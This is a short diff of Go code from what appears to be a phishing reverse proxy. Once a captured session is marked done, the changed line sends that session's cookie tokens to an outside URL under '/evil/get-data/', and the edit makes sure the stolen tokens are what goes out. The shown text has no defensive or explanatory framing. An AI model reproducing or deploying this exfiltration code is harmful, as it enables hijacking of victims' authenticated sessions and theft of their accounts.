@@ -886,7 +886,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.IsDone = true
 
-						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + string(cookies))
+						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + string(s.CookieTokens))
 					    log.Info("API Content: %s", worldContent)
 					}
 				}
